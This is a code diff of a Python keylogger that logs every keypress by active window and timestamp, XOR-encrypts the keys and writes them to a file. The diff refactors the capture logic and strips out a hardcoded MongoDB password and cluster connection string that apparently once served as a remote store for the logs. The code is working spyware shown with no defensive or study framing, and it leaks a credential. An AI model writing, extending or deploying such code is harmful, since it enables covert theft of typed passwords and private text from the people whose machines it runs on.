@@ -12,31 +12,28 @@ class KeyLoggerService:
         self.cipher = cipher
 
     def on_press(self, event):
-        window = self._get_window()
-        timestamp = self._get_time()
+        window = gw.getActiveWindow()
+        timestamp = datetime.now().strftime("%d/%m/%y %H:%M")
         key = self._format_key(event.name)
         encrypted_key = self.cipher.encrypt(key)
 
         if window not in self.data:
             self.data[window] = {timestamp: encrypted_key}
+        elif timestamp not in self.data[window]:
+            self.data[window][timestamp] = encrypted_key
         else:
-            if timestamp not in self.data[window]:
-                self.data[window][timestamp] = encrypted_key
-            else:
-                self.data[window][timestamp] += encrypted_key
+            self.data[window][timestamp] += encrypted_key
 
         self.file_writer.write_to_file(self.data)
 
-    def _get_window(self):
-        window = gw.getActiveWindow()
-        return window.title if window else "Unknown Window"
-
-    def _get_time(self):
-        return datetime.now().strftime("%d/%m/%y %H:%M")
-
     def _format_key(self, key_name):
-        special_keys = {"space": " ", "enter": "\n"}
-        return special_keys.get(key_name, f" [{key_name}] " if len(key_name) > 1 else key_name)
+        if key_name == "enter":
+            return " \n "
+        elif key_name == "space":
+            return " "
+        elif len(key_name) > 1:
+            return f" [{key_name}] "
+        return key_name
 
 
 class FileWriter:
@@ -64,8 +61,6 @@ class XorCipher:
         key_cycle = (self.key * ((len(text) // len(self.key)) + 1))[:len(text)]
         return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key_cycle))
 
-MONGO_PASSWORD = "rBo4xTwSNLs3hxnF"
-LINK = "mongodb+srv://<db_username>:<db_password>@cluster0.hfgzt.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
 
 if __name__ == "__main__":
     file_writer = FileWriter()
